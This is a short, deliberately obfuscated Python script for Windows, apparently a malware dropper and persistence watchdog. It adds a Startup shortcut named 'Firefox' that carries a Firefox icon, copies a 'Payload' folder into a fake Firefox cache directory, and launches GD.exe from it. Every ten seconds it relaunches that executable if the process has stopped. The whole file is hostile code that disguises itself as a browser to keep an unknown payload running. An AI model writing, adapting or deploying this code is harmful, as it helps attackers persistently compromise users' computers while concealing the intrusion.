import subprocess as G,os as A
from sys import executable as I
from time import sleep
for J in ['pywin32','psutil','shutil']:
	try:G.check_call([I,'-m','pip','install',J])
	except:pass
import psutil as K,shutil as C
from win32com.client import Dispatch as L
D='Firefox'
B=f"C:\\{D}\\Cache\\Disk Cache\\"
E='3.8.2023'
F=A.getcwd()
H='GD.exe'
def M():C=f"{A.getenv('APPDATA')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{D}.lnk";E=__file__;G=L('WScript.Shell');B=G.CreateShortCut(C);B.IconLocation=A.path.join(F,f"{D}.ico");B.Targetpath=E;B.WorkingDirectory=F;B.save()
def N():
	if not A.path.isdir(B):A.makedirs(B)
	try:C.rmtree(A.path.join(B,E))
	except:pass
	C.copytree(A.path.join(F,'Payload'),A.path.join(B,E),copy_function=C.copy);G.Popen(A.path.join(B,E,H))
def O():return H in(A.name()for A in K.process_iter())
M()
while True:
	if not O():N()
	sleep(10)